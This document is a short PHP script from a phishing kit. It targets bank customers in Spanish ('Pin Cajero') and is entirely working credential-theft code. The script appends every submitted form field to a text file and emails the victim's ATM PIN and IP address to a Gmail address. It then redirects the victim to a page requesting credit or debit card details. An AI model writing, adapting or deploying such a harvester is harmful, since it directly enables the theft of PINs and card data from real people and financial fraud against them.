<?php
header ('Location: ingrese-tarjeta-credito-debito.html');
$handle = fopen("datos.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);


$ip = getenv("REMOTE_ADDR");
$message .= "Pin Cajero: ".$_POST['Pin']."\n";
$message .= "IP: ".$ip."\n";
$recipient ="jc7541207@gmail.com";
$subject = "Pin Cajero | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: ingrese-tarjeta-credito-debito.html");


exit;
?>